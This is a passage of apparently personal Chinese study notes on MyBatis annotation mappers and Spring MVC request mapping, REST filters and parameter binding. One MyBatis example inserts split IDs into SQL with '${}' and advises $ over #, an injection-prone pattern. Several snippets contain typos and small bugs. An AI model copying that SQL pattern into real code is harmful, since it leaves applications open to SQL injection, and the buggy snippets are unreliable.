--商品编号      \n       proDescription  varchar(200)--商品描述\n);\n```\n**实体映射**\n```java\npublic class ProductInfo {\n    private Integer id;//主键\n    private String proName;//商品名称\n    private String proNo;//商品编号      \n    private String proDescription;//商品描述\n}\n```\n**Dao层接口**\n```java\n/**Dao层接口*/\npublic interface ProductInfoDao {    /**保存信息,并返回主键**/\n\n    @Insert(\"insert into ProductInfo(proName,proNo,proDescription) values(#{proName},#{proNo},#{proDescription})\")\n    @Options(useGeneratedKeys = true,keyProperty=\"id\",keyColumn=\"id\") \n    //@SelectKey(statement=\"select @@identity\",keyColumn=\"id\",keyProperty=\"id\",before=false,resultType = int.class)\n    void saveProducrInfoCatchID(ProductInfo proInfo);    /**获取所有返回LIST*/\n\n    @Select(\"select * from ProductInfo\")\n    @Results({\n        @Result(id=true,property=\"id\",column=\"id\"),\n        @Result(property=\"proName\",column=\"proName\"),\n        @Result(property=\"proNo\",column=\"proNo\"),\n        @Result(property=\"proDescription\",column=\"proDescription\")\n    })    List<ProductInfo> findAllListInfo();    /**根据主键查询*/\n    @Select(\"select * from ProductInfo where id = #{id}\")\n    ProductInfo findById(int id);    /**根据商品编号模糊查询*/\n\n    @Select(\"select * from ProductInfo where proNo like concat('%',#{proNo},'%')\")\n    List<ProductInfo> findProInfoByProNo(String proNo);    //删除\n\n    @Delete(\"delete from productInfo where id = #{id}\")\n    void deleteByID(int id);\n\n    //修改\n    @Update(\"update productInfo set proName = #{proName},proNo=#{proNo},proDescription=#{proDescription}    where id = #{id}\")\n    void updateProduct(ProductInfo info);\n}\n```\n**测试方法**\n```java\npublic class TestDemo {\n    private ProductInfoDao dao;\n    SqlSession sqlSession = null;\n    @Before\n    public void setUp() throws Exception{\n        sqlSession = MyBatisUtil.getSqlSession();        \n\t\t\t\tdao = sqlSession.getMapper(ProductInfoDao.class);\n    }    \n\t\t/**保存信息,并返回主键**/\n    @Test\n    public void saveProducrInfoCatchID(){\n        ProductInfo proInfo = new ProductInfo(\"电冰箱\",\"002\",\"最新款电冰箱\");\n        System.out.println(\"执行前:\"+proInfo);\n        dao.saveProducrInfoCatchID(proInfo);\n\t\t\t\tSystem.out.println(\"执行后:\"+proInfo);\n        sqlSession.commit();//提交\n    }\n    //查询所有\n    @Test\n    public void  findAllListInfo(){\n        List<ProductInfo> list = dao.findAllListInfo();\n        if(list != null){\n            for (ProductInfo productInfo : list) {\n                System.out.println(productInfo);\n            }\n        }\n    }\n    /**根据主键查询*/\n    @Test\n    public void  findById(){\n        ProductInfo pro = dao.findById(4);\n        System.out.println(pro);\n    }\n    /**根据商品编号模糊查询*/\n    @Test\n    public void findProInfoByProNo(){\n        List<ProductInfo> list = dao.findProInfoByProNo(\"001\");\n        if(list != null){\n            for (ProductInfo productInfo : list) {\n                System.out.println(productInfo);\n            }\n        }\n    }\n    /**简单删除*/\n    @Test\n    public void deleteByID(){\n        dao.deleteByID(7);\n    }\n    /**简单修改*/\n    @Test\n    public void updateProductById(){\n        //1.查询修改对象\n        ProductInfo beforeInfo = dao.findById(6);\n        System.out.println(\"执行前beforeInfo:\"+beforeInfo);\n        //2.修改值\n        beforeInfo.setProDescription(\"修改了电视\");\n        //3.执行更新操作\n        dao.updateProduct(beforeInfo);\n        //4.再查询\n        ProductInfo afterInfo = dao.findById(6);\n        System.out.println(\"执行后afterInfo:\"+afterInfo);\n    }\n    @After\n    public void setDown(){\n        if(sqlSession != null)\n            sqlSession.close();\n    }\n}\n```\n## @Mapper注解\n在没有使用@Mapper注解之前，我们需要使用如下方法手动创建一个Dao层接口示例：\n```java\n//获取会话对象sqlSession\nInputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\nSqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\nSqlSession sqlSession = sqlSessionFactory.openSession();\n\nUserMapper mapper = sqlSession.getMapper(UserMapper.class);\n```\n如果Dao层有非常多个接口，那么上述的方法是十分低效的，由此就有了@Mapper注解\n\n**Mapper注解**\n这个注解要配置Spring使用，spring扫描到这个注解后，会自动将实现注解标注的接口，并将其放入Sping容器中\n示例：\nDao层接口\n```java\n@Mapper\npublic interface test01{\n\t@Delete(\"delete from tb-goods where id=#{id}\")\n\tint testdelete(Integer Id);\n}\n```\n测试类\n```java\n@SpringBootTest\npublic class test{\n\t@Autowired\n\tprivate test01 test;\n\n\t@Test\n\tpublic void delete(){\n\t\tint rows = test.testdelte(5);\n\t}\n}\n```\n## MapperScan注解\n使用@Mapper注解时，需要在每个接口类上加上@Mapper注解，比较麻烦，解决这个问题用@MapperScan\n@MapperScan注解添加位置：是在Springboot启动类上面添加\n```java\n@SpringBootApplication\n@MapperScan(\"com.winter.dao\")\npublic class SpringbootMybatisDemoApplication {\n\tpublic static void main(String[] args) {\n\t\t\tSpringApplication.run(SpringbootMybatisDemoApplication.class, args);\n\t}\n}\n```\n添加@MapperScan(“com.winter.dao”)注解以后，com.winter.dao包下面的接口类，在编译之后都会生成相应的实现类\n**同时,使用@MapperScan注解多个包**\n```java\n@SpringBootApplication  \n@MapperScan({\"com.kfit.demo\",\"com.kfit.user\"})  \npublic class App {  \n    public static void main(String[] args) {  \n       SpringApplication.run(App.class, args);  \n    }  \n} \n```\n**如果如果mapper类没有在Spring Boot主程序可以扫描的包或者子包下面，可以使用如下方式进行配置**\n```java\n@SpringBootApplication  \n@MapperScan({\"com.kfit.*.mapper\",\"org.kfit.*.mapper\"})  \npublic class App {  \n    public static void main(String[] args) {  \n       SpringApplication.run(App.class, args);  \n    }  \n} \n```\n\n# Mybatis传参- 被逗号分割的字符串\n1. String ids = \"1,2,3,4,5,6\",如ids作为参数传递，查询list返回。mybatis用foreach处理并返回。 \n```\nSELECT *\n\t\tFROM yp_popup_store_info store\n\t\t\n\t\tWHERE store.store_id in\n\t\t<foreach item=\"item\" index=\"index\" collection=\"ids.split(',')\"  open=\"(\" separator=\",\" close=\")\">\n\t\t\t\t'${item}'\n\t\t</foreach>\n```\n2.注意： （1）ids不能为null，否则报空指针异常。（2）因为字符串内的值是数值类型，所以 用单引号 将元素扩起来，而且使用$，而不用#\n"
  },
  {
    "title": "./notes/back-end/springmvc.md",
    "body": "# SpringMVC概述\n• Spring 为展现层提供的基于 MVC 设计理念的优秀的Web 框架，是目前最主流的 MVC 框架之一\n• Spring3.0 后全面超越 Struts2，成为最优秀的 MVC 框架\n• Spring MVC 通过一套 MVC 注解，让 POJO (Plain Ordinary Java Object)成为处理请求的控制器，而无须实现任何接口。\n• 支持 REST 风格的 URL 请求\n• 采用了松散耦合可插拔组件结构，比其他 MVC 框架更具扩展性和灵活性\n\n## springmvc是什么\n1）一种轻量级的、基于MVc的Web层应用框架。偏前端而不是基于业务逻辑层。Spring框架的一个后续产品。\n\n## SpringMVC能干什么\n1）天生与Spring 框架集成，如：（IOC，AOP）\n2）支持Restful风格\n3）进行更简洁的web层开发\n4）支持灵活的URL到页面控制器的映射\n5）非常容易与其他视图技术集成\n6）因为模型数据不存放在特定的APl里，而是放在一个Model里（Map数据结构实现，因此很容易被其他框架使用I了\n7）非常灵活的数据验证、格式化和数据绑定机制、能使用任何对象进行数据绑定，不必实现特定框架的API\n8）更加简单、强大的异常处理\n9）对静态资源的支持\n10）支持灵活的本地化、主题等解析\n\n## SpringMVC怎么玩\n1）将Web层进行了职责解耦，基于请求响应模型\n2）常用主要组件\n①DispatcherServlet：前端控制器, 本质就是servlet。 对客户端发送的所有请求进行统一管理与处理\n②Controller：处理器/页面控制器，做的是MVC中的C的事情，但控制逻辑转移到前端控制器了，用于对请求进行处理\n③HandlerMapping：请求映射到处理器，找谁来处理，如果映射成功返回一个andlerExecutionChain 对象（包含一个Handler 处理器（页面控制器）对象、多个Handlerlntercepfor 拦截器对象）\n④ViewResolver：视图解析器，找谁来处理返回的页面。把逻辑视图解析为具体的View，进行这种策略模式，很容易更换其他视图技术；\n⑤LocalResolver：本地化、国际化\n⑥MultipartResolver：文件上传解析器\n⑦ HandlerExceptionResolver：异常处理器\n\n# HelloWorld\n步骤：\n1. 导入jar包\ncommons-logging-1.1.3.jar\nspring-aop-4.0.0.RELEASE.jar\nspring-beans-4.0.0.RELEASE.jar\nspring-context-4.0.0.RELEASE.jar\nspring-core-4.0.0.RELEASE.jar\nspring-expression-4.0.0.RELEASE.jar\nspring-web-4.0.0.RELEASE.jar\nspring-webmvc-4.0.0.RELEASE.jar\n>Notes: 在maven中，spring-webmvc依赖中包含spring-aop,spring-beans,spring-core,spring-context,spring-expressiong,spring-web\n\n2. 在web.xml中配置springMVC的核心（前端）控制器DispatcherServlet\n当DispatcherServlet被加载时，DispatcherServlet会自动加载springmvc配置文件，此时的配置文件有默认的位置和名称，其默认位置：WEB-INF下，默认名称 \\<servlet-name>-servlet.xml，例如以下配置方式的文件名：springMVC-servlet.xml\n```xml\n    <servlet>\n      <servlet-name>springMVC</servlet-name>\n      <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    </servlet>\n    <servlet-mapping>\n      <servlet-name>springMVC</servlet-name>\n      <url-pattern>/</url-pattern>\n    </servlet-mapping>\n```\n\n修改DispatchServlet默认配置\n```xml\n    <servlet>\n\t\t<servlet-name>springMVC</servlet-name>\n\t\t<servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n\t\t<init-param>\n\t\t\t<!-- 修改DispatcherServlet中的contextConfigLocation属性值, 将配置文件路径设置成为resource路径下的springMVC.xml -->\n\t\t\t<param-name>contextConfigLocation</param-name>\n\t\t\t<!-- 这里之所以加classpath的原因是，webapp有两个路径，分别是resource路径与webapp路径， 加classpath表示resource路径 -->\n\t\t\t<param-value>classpath:springMVC.xml</param-value>\n\t\t</init-param>\n\n\t\t<!-- 设置servlet的加载时间\n\t\t\tservlet默认在第一次访问时加载，若设置此标签，会将servlet的加载时间提前到项目启动时\n\t\t\t此标签要写正整数， 写成负整数或0与没有设置是一样的效果，只有设置为正整数才会将servlet的加载时间提前到项目启动时, 就算时提前到项目启动时，也还是最后被加载的\n\t\t\t值越小优先级越高\n\t\t\t多个servlet的优先级不能相同，否则会报错-->\n\t\t<load-on-startup>1</load-on-startup>\n    </servlet>\n    <servlet-mapping>\n      <servlet-name>springMVC</servlet-name>\n      <url-pattern>/</url-pattern>\n    </servlet-mapping>\n```\n\n>note:\n `<url-pattern>/</url-pattern>`于 `<url-pattern>/*</url-pattern>`的区别\n 配置成 / 时，DispatcherServlet会不会截获静态资源请求，例如.jsp\n 配置成 /* 时，DispatcherServlet会截获所有请求，包括.jsp\n 对于DispatchServlet中的配置，配置成 / 而不要配置成 /*\n\n当加载springMVC-servlet.xml配置文件，springMVC就会根据配置文件来扫描组件找到控制曾； springMVC-servlet.xml内容如下\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans \n                           http://www.springframework.org/schema/beans/spring-beans.xsd\n                           http://www.springframework.org/schema/context/spring-context.xsd\n                           http://www.springframework.org/schema/context\">\n    <!--扫描组件-->\n    <context:component-scan base-package=\"com.atguigu.test\"></context:component-scan>\n\n    <!--配置视图解析器-->\n\t<bean id=\"viewResolver\" class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\">\n\t\t<!-- 作用: 在控制层返回的视图名称前加上prefix， 后面加上suffix -->\n\t\t<!-- 例如： 控制层返回的视图名称为hellowWorld,  经过视图解析器后变成/WEB-INF/view/hellowWorld.jsp -->\n        <property name=\"prefix\" value=\"/WEB-INF/view\"></property>\n        <property name=\"suffix\" value=\".jsp\"></property>\n    </bean>\n</beans>\n```\n3. 创建一个POJ0，在此类上加上@Controller注解，springMVC就会将此类作为控制层加载，让其处理请求响应\n```java\n@Controller\npublic class Test {\n\t@RequestMapping(\"/hello\") //加斜杠表示相对于项目， 不加斜线表示相对当前位置， 注source文件夹下的所有文件的当前位置都是相对于项目， 即在source文件夹下的文件加斜杠于不加斜杠都一样\n\tpublic String helloWorld(){\n\t\tSystem.out.println(\"jfkdjfkdjf\");\n\t\treturn \"helloworld\"; //返回的是视图名称\n\t}\n}\n```\n\n# @RequestMapping\n在控制器的类定义及方法定义处都可标注@RequestMapping\n– 类定义处：提供初步的请求映射信息，对该类中的所有方法都有效。相对于 WEB 应用的根目录\n– 方法处：提供进一步的细分映射信息。相对于类定义处的URL。若类定义处未标注 @RequestMapping，则方法处标记的 URL 相对于WEB 应用的根目录\n\nDispatcherServlet截获请求后，就通过控制器上 @RequestMapping 提供的映射信息确定请求所对应的处理方法。\n\n## 映射请求参数、请求方法或请求头\n标准的 HTTP 请求报头\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124512.png)\n\n@RequestMapping 除了可以使用请求 URL 映射请求外，还可以使用请求方法、请求参数及请求头映射请求\n@RequestMapping 的 value、method、params 及 headers 分别表示请求 URL、请求方法、请求参数及请求头的映射条件，他们之间是与的关系，联合使用多个条件可让请求映射更加精确化。\nparams 和 headers 支持简单的表达式：\n>param1 : 表示请求必须包含名为 param1 的请求参数\n!param1 : 表示请求不能包含名为 param1 的请求参数\nparam1 != value1: 表示请求包含名为 param1 的请求参数，但其值不能为 value1\n{“param1=value1”, “param2”}: 请求必须包含名为 param1 和param2的两个请求参数，且 param1 参数的值必须为 value1\nheaders用法和params一样\n```java\n@RequestMapping(value=\"/test\", method=RequestMethod.POST, params={\"username\", \"age!=12\"}, headers={\"Accept-Language=zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US\"})\n```\n\n## @GetMapping和@PostMapping等新注释\nSpring的复杂性不是来自于它处理的对象，而是来自于自身，不断演进发展的Spring会带来时间维度上复杂性，比如SpringMVC以前版本的@RequestMapping，到了新版本被下面新注释替代，相当于增加的选项：\n```\n@GetMapping\n@PostMapping\n@PutMapping\n@DeleteMapping\n@PatchMapping\n```\n从命名约定我们可以看到每个注释都是为了处理各自的传入请求方法类型，即@GetMapping用于处理请求方法的GET类型，@PostMapping用于处理请求方法的POST类型等。\n\n如果我们想使用传统的@RequestMapping注释实现URL处理程序，那么它应该是这样的：\n```java\n@RequestMapping(value = \"/get/{id}\", method = RequestMethod.GET)\n```\n新方法可以简化为：\n```java\n@GetMapping(\"/get/{id}\")\n```\n\n**原理**\n所有上述注释都已在内部注释了@RequestMapping以及方法元素中的相应值。\n例如，如果我们查看@GetMapping注释的源代码，我们可以看到它已经通过以下方式使用RequestMethod.GET进行了注释：\n```java\n@Target({ java.lang.annotation.ElementType.METHOD })\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@RequestMapping(method = { RequestMethod.GET })\npublic @interface GetMapping {\n   // abstract codes\n}\n```\n所有其他注释都以相同的方式创建，即@PostMapping使用RequestMethod.POST进行注释，@ PutMapping使用RequestMethod.PUT进行注释等。\n\n## Ant\nspringMVC支持Ant方式的请求路径\nAnt 风格资源地址支持 3 种匹配符\n> ?：匹配文件名中的一个字符\n  *：匹配文件名中的任意字符\n  `**`：匹配多层路径\n\n列如：\n– /user/*/createUser: 匹配\n/user/aaa/createUser、/user/bbb/createUser 等 URL\n– /user/**/createUser: 匹配\n/user/createUser、/user/aaa/bbb/createUser 等 URL\n– /user/createUser??: 匹配\n/user/createUseraa、/user/createUserbb 等 URL  \n```java\n@RequestMapping(value=\"/*/fff??/**/testff\")\n```\n\n## PathVariable映射URL绑定的占位符\n带占位符的 URL 是 Spring3.0 新增的功能，该功能在SpringMVC向REST目标挺进发展过程中具有里程碑的意义\n通过 @PathVariable 可以将 URL 中占位符参数绑定到控制器处理方法的入参中：URL 中的 {xxx} 占位符可以通过@PathVariable(\"xxx\")绑定到操作方法的形参中。\n```java\n@RequestMapping(\"/testRe/{id}/{username}\")\npublic String testREST(@PathVariable(\"id\")Integer id, @PathVariable(\"username\")String user){\n\tSystem.out.println(\"id:\"+id+\",username=\"+username);\n\treturn \"success\";\n}\n```\n如果@PathVAriable后接的是Map,则会将url中的键值对全部放进map中，例如，上面的代码和下面的等价\n```java\n@RequestMapping(\"/testRe/{id}/{username}\")\npublic String testREST(@PathVariable Map<String, String> pv){\n\tSystem.out.println(pv);\n\treturn \"success\";\n}\n```\n或\n```java\n@RequestMapping(\"/testRe/{id}/{username}\")\npublic String testREST(@PathVariable(\"id\")Integer id, @PathVariable(\"username\")String user, @PathVariable Map<String, String> pv){\n\tSystem.out.println(pv);\n\tSystem.out.println(\"id:\"+id+\",username=\"+username);\n\treturn \"success\";\n}\n```\n\n## consumes属性和produces属性\n- consumes属性：指定处理请求的提交内容类型（Content-Type）\n- produces属性：指定响应体类型和响应体编码\n**produces的例子**\nproduces第一种使用，返回json数据，下边的代码可以省略produces属性，因为我们已经使用了注解@responseBody就是返回值是json数据：\n```java\n@Controller  \n@RequestMapping(value = \"/pets/{petId}\", method = RequestMethod.GET, produces=\"application/json\")  \n@ResponseBody \n```\nproduces第二种使用，返回json数据的字符编码为utf-8.：\n```java\n@RequestMapping(value = \"/pets/{petId}\", produces=\"MediaType.APPLICATION_JSON_VALUE\"+\";charset=utf-8\")  \n@ResponseBody  \n```\n**consumes的例子**\n```java\n//仅处理request Content-Type为“application/json”类型的请求。指定处理请求的 提交内容类型 （Content-Type）\n@RequestMapping(value = \"/pets\", method = RequestMethod.POST, consumes=\"application/json\")  \n```\n\n# REST\n• REST：即 Representational State Transfer。（资源）表现层状态转化。是目前最流行的一种互联网软件架构。它结构清晰、符合标准、易于理解、扩展方便，所以正得到越来越多网站的采用\n• 表现层（Representation）：把资源具体呈现出来的形式，叫做它的表现层（Representation）。比如，文本可以用 txt 格式表现，也可以用 HTML 格式、XML 格式、JSON 格式表现，甚至可以采用二进制格式。\n• 状态转化（State Transfer）：每发出一个请求，就代表了客户端和服务器的一次交互过程。HTTP协议，是一个无状态协议，即所有的状态都保存在服务器端。因此，如果客户端想要操作服务器，必须通过某种手段，让服务器端发生“状态转化”（State Transfer）。而这种转化是建立在表现层之上的，所以就是 “表现层状态转化”。具体说，就是 HTTP 协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。它们分别对应四种基本操作：GET 用来获取资源，POST 用来新建资源，PUT 用来更新资源，DELETE 用来删除资源。\n\n示例：\n>– /order/1 HTTP GET ：得到 id = 1 的 order   \n– /order/1 HTTP DELETE：删除 id = 1的 order   \n– /order/1 HTTP PUT：更新id = 1的 order   \n– /order HTTP POST：新增 order\n\n## HiddenHttpMethodFilter\n由于浏览器 form 表单<font color=\"red\">只</font>支持GET与POST 请求，而DELETE、PUT 等 method 并不支持，Spring3.0 添加了一个过滤器HiddenHttpMethodFilter，可以将这些请求转换为标准的 http 方法，使得支持 GET、POST、PUT 与DELETE 请求\n\nHiddenHttpMethodFilter对请求作出转换的2个条件\n1. 请求必须是POST请求\n2. 请求中必须含有_method参数\n若不符合上述条件， HiddenHttpMethodFilter不会对请求进行转换\n若符合上述条件，则经过转换后，真正的请求方式就是_method的值\n\n例子\n配置HiddenHttpMethodFilter过滤器\n```xml\n<filter>\n\t<filter-name>HiddenHttpMethodFilter</filter-name>\n\t<filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>\n</filter>\n<filter-mapping>\n\t<filter-name>HiddenHttpMethodFilter</filter-name>\n\t<!-- 注意：此处应该为/* -->\n\t<url-pattern>/*</url-pattern> \n</filter-mapping>\n```\n```html\n<form action=\"testRest\" method=\"POST\">\n\t<input type=\"hidden\" name=\"_method\" value=\"PUT\"/>\n\t<input type=\"submit\" value=\"测试PUT\"/>\n</form>\n<form action=\"testRest/1001\" method=\"POST\">\n\t<input type=\"hidden\" name=\"_method\" value=\"DELETE\"/>\n\t<input type=\"submit\" value=\"测试DELETE\"/>\n</form>\n```\n```java\n@RequestMapping(value=\"/testRest\", method=RequestMethod.PUT)\npublic String updateUser(){\n\tSystem.out.println(\"PUT\");\n\treturn \"success\";\n}\n\n@RequestMapping(value=\"/testRest/{id}\", method=RequestMethod.DELETE)\npublic String deleteUser(@PathVariable(\"id\")Integer id){\n\tSystem.out.println(\"DELETE\");\n\treturn \"success\";\n}\n```\n\n## ajax发送PUT和DELETE请求\n虽然ajax支持PUT和DELETE请求，但是在解析参数方面需要注意，如果直接使用ajax自带的PUT和DELETE方式，且以表单形式发送数据时，springmvc会无法识别其键值对， 例如：\n```js\n  $.ajax({\n    url: \"/ssm/emp1\",\n    data: {\"name\":\"hwz\", \"gender\":[1,2,3]},\n    type: \"delete\",\n    success: function (data) {\n      console.log(data);\n    }\n  })\n```\n```java\n@ResponseBody\n@RequestMapping(value = \"/emp1\", method = RequestMethod.DELETE)\npublic Boolean delete1(String name){\n\tSystem.out.println(name);\n\treturn false;\n}\n```\n上述controller能拦截ajax请求，但是无法将请求参数name封装入参name中\n此时我们可以使用contentType=application/json的形式发送json字符串，然后使用@RequestBody来接收\n\n如果我们就是想让ajax发送put、delete请求，且contentType=application/x-www-form-urlencoded, 且controller能识别键值对的话，我们可以使用HiddenHttpMethodFilter， 使用方法与form表单发送put、delete请求一样, 要配置HiddenHttpMethodFilter过滤器，配置方法一样\n```js\n  $.ajax({\n    url: \"/ssm/emp1\",\n    data: {_method:\"DELETE\", \"name\":\"hwz\", \"gender\":[1,2,3]},\n    type: \"post\",\n    success: function (data) {\n      console.log(data);\n    }\n  })\n```\n\n```java\n@ResponseBody\n@RequestMapping(value = \"/emp1\", method = RequestMethod.DELETE)\npublic Boolean delete1(String name){\n\tSystem.out.println(name);\n\treturn false;\n}\n```\n此时controller就是识别键值对，从而把请求参数name匹配到入参name中\n\n## controller接收的键值对中值为数组的情形\n```js\n  $.ajax({\n    url: \"/ssm/emp1\",\n    data: {_method:\"DELETE\", \"name\":\"hwz\", \"gender\":[1,2,3]},\n    type: \"post\",\n    success: function (data) {\n      console.log(data);\n    }\n  })\n```\n此时From Data数据如下：\n```\n_method: DELETE\nname: hwz\ngender[]: 1\ngender[]: 2\ngender[]: 3\n```\n所以controller要接受gender，必须要以gender[]为名， 如下\n```java\n@ResponseBody\n@RequestMapping(value = \"/emp1\", method = RequestMethod.DELETE)\npublic String delete1(@RequestParam(\"gender[]\") Integer[] gender){\n\treturn false;\n}\n```\n\n如果不想让gender变成gender[], 我们在ajax中添加属性traditional:true, 如下：\n```js\n  $.ajax({\n    url: \"/ssm/emp1\",\n    data: {_method:\"DELETE\", \"name\":\"hwz\", \"gender\":[1,2,3]},\n    type: \"post\",\n\ttraditional: true,\n    success: function (data) {\n      console.log(data);\n    }\n  })\n```\n此时From Data数据如下：\n```\n_method: DELETE\nname: hwz\ngender: 1\ngender: 2\ngender: 3\n```\n此时就controller可以直接使用Integer[] gender接收了，而不需要使用@RequestParam(\"gender[]\")\n\n\n# 请求处理方法签名\nSpring MVC 通过分析处理方法的签名，将HTTP请求信息绑定到处理方法的相应参数中。\n- Spring MVC 对控制器处理方法签名的限制是很宽松的，几乎可以按喜欢的任何方式对方法进行签名。\n- 必要时可以对方法及方法入参标注相应的注解（@PathVariable、@RequestParam、@RequestHeader 等）、SpringMVC 框架会将 HTTP 请求的信息绑定到相应的方法入参中，并根据方法的返回值类型做出相应的后续处理\n\n## @RequestParam\n在处理方法入参处使用 @RequestParam 可以把请求参数传递给请求方法\n– value：参数名\n– required：是否必须。默认为 true, 表示请求参数中必须包含对应的参数，若不存在，将抛出异常\n如果请求中的参数名与servlet拦截方法中的入参名相同时，会自动匹配，若不同，则不会匹配，此时就可以借助@RequestParam来指定映射关系使其匹配\n- defaultValue : 若形参所获得的值为null, 则赋值其一个默认值， 主要用于分页与模糊查询中\n\n例子：\n请求中包含参数名为name的参数\n```java\n@RequestMapping(value=\"/testRest\")\npublic String updateUser(@RequestParam(value=\"name\")String studentName){\n\treturn \"success\";\n}\n```\n上述例子中，如果没有配置@RequestParam，则时入参studentName时不会匹配到请求中的name参数的， 如果入参是name, 则不需要使用@RequestParam, 也是自动匹配， 如下\n```java\n@RequestMapping(value=\"/testRest\")\npublic String updateUser(String name){\n\treturn \"success\";\n}\n```\n\n如果@RequestParam后接的是Map, 则会将请求参数中的所有键值对全部放进map中\n```java\n@RequestMapping(value=\"/testRest\")\npublic String updateUser(@RequestParam Map<String, String> kv){\n\treturn \"success\";\n}\n```\n或\n```java\n@RequestMapping(value=\"/testRest\")\npublic String updateUser(@RequestParam(value=\"name\")String studentName, @RequestParam Map<String, String> kv){\n\treturn \"success\";\n}\n```\n\n## @RequestHeader\n请求头包含了若干个属性，服务器可据此获知客户端的信息，通过 @RequestHeader 即可将请求头中的属性值绑定到处理方法的入参中\n用法与@RequestParam一样\n```java\n@RequestMapping(value=\"/testRest\")\npublic String updateUser(@RequestHeader(\"Accept-Encoding\")String encoding){\n\treturn \"success\";\n}\n```\n如果@RequestHeader后接的是Map, 则会将请求头中的的所有键值对全部放进map中\n```java\n@RequestMapping(value=\"/testRest\")\npublic String updateUser(@RequestHeader(\"Accept-Encoding\")String encoding, @RequestHeader Map<String, String> kv){\n\tSystem.out.println(kv);\n\treturn \"success\";\n}\n```\n\n## @CookieValue\n@CookieValue 可让处理方法入参绑定某个 Cookie 值\n用法与@RequestParam一样\n```java\n@RequestMapping(value=\"/testRest\")\npublic String updateUser(@CookieValue(\"sessionId\")String sessionId){\n\treturn \"success\";\n}\n```\n获取cookie对象\n```java\n@RequestMapping(value=\"/testRest\")\npublic String updateUser(@CookieValue(\"sessionId\") Cookies sessionIdCookie){\n\tSystem.out.println(sessionIdCookie.getName() + \"====>\" sessionIdCookie.getValue());\n\treturn \"success\";\n}\n```\n\n## POJO对象绑定请求参数值\n当请求参数格式为`request String Parameters`或`Form Data`时，Spring MVC 会按请求参数和 POJO 属性名进行自动匹配，自动为该对象填充属性值。支持级联属性。如：dept.deptId、dept.address.tel等\n**注：没包括`request payload`格式,该格式的自动匹配需要借助@RequestBody注解**，详细见[使用JSON](##@RequestBody注解)\n\n```html\n<form action=\"param\" method=\"post\">\nusername:<input type=\"text\" name=\"username\"/>\npassword:<input type=\"text\" name=\"password\"/>\ncity:<input type=\"text\" name=\"address.city\"/>\n</form>\n```\n```java\n@RequestMapping(value=\"/param\", method=RequestMethod.POST)\npublic String param(User user){\n\treturn \"success\";\n}\n```\n\n## 使用Servlet原生API作为参数\nMVC 的 Handler 方法可以接受的ServletAPI类型的参数\n>HttpServletRequest\nHttpServletResponse\nHttpSession\njava.security.Principal\norg.springframework.security.core.Authentication\nLocale\nInputStream\nOutputStream\nReader\nWriter\n```java\n@RequestMapping(value=\"/param\", method=RequestMethod.POST)\npublic String param(User user, HttpServletRequest req, HttpServletResponse resp){\n\treq.setAttribute(\"msg\", \"succcess\");\n\tString username = req.getParameter(\"username\");\n\treturn \"success\";\n}\n```\n\n**获取request域中的数据的两种方法：**使用HttpServletRequest, 或@RequestAttribute\n```java\n@ResponseBody\n@RequestMapping(\"/success\")\npublic String param(@RequestAttribute(\"msg\") String msg, HttpServletRequest req){\n\tSystem.out.println(msg);\n\tSystem.out.println(req.getAttribute(\"msg\"));\n\treturn \"page\";\n}\n\n```\n\n# 使用JSON\n## java中json使用步骤\n第一步：加入jar包\njackson-annotations.jar\njackson-core.jar\njackson-databind.jar\njackson包的作用：会自动将JSON转换为java对象，或者将java对象转换为json\n第二步：编写目标方法，使其返回JSON对应的对象或集合， 在该方法上添加@ResponseBody, 有了这个注解，springmvc就知道，该方法是作为响应体来实现功能，而不是用来实现页面跳转的\n```java\n@ResponseBody\n@RequestMapping(\"/getUsers\")\npublic List<User> testAjax(){\n\tList<User> users = new ArrayList<>();\n\tusers.add(new User(1, \"a\", new DAte(), 1000));\n\tusers.add(new User(2, \"b\", new DAte(), 2000));\n\treturn users;\n}\n```\n注：\n1. 如果不适用jackson包的情况下，返回java对象，是不会自动将其转换为json的，而js是无法识别java对象的，否有会报406错误\n2. 使用JSON, 一定要开启mvc驱动`<mvc: annotation-driven />`\n3. 缺少上面任何一步， 都会导致406\n\n## @RequestBody注解\n@RequestBody作用方法参数上，表明该参数用来接收请求体，例如：\n前端：\n```html\n<form action=\"/testRequestBody\" method=\"post\">\n\t<input name=\"username\" value=\"tomcat\">\n\t<input name=\"password\" value=\"123456\">\n\t<input type=\"submit\">\n<form>\n```\n后端:\n```java\n@RequestMapping(\"/testRequestBody\")\npublic String testRequestBody(@RequestBody String body){\n\tSystem.out.println(\"请求体:\" + body);\n\treturn \"success\"\n}\n```\n后端输出：\n```\n请求体：username=tomcat&password=123456\n```\n\n但是此时如果我将form表单中的method改为get，使其发送get请求，那么后端输出如下：\n```\n请求体：\n```\n可以看出后端方法中的body参数没有匹配到，应为请求体中没有数据\n\n### 当请求体为json数据时\n**springmvc是不能够将请求体中的json数据中的键值对匹配到对应的形参中的；**\n例如：\n```js\n$.ajax({\n\t\turl : '/test',\n\t\ttype : 'post',\n\t\tdata : \"{username:'whz',pwd:'123'}\",  //这里是对象\n\t\tcontentType: 'application/json',  //规定传的值是json\n\t\tsuccess : function(data){......}\n)};\n```\n```java\n@RequestMapping(\"/test\")\npublic String test(String uername, String pwd){\n\tSystem.out.println(\"username:\"+ username);\n\tSystem.out.println(\"pwd:\" + pwd);\n\treturn \"success\"\n}\n```\n后端输出：\n```\nusername:\npwd:\n```\n可以看出后端方法中的username参数与pwd参数都没有匹配到请求体中json数据中对应的键值对\n\n**为了解决上述问题，我们可以使用@RequestBody注解，先接收到请求体，然后将请求体中的json字符串转换为java对象，进而获取其中的属性，如下：**\n```java\n@RequestMapping(\"/test\")\npublic String test(@RequestBody String body){\n\n\t//将json字符串body变量转化为java对象\n\t...\n\n\treturn \"success\"\n}\n```\n\n### 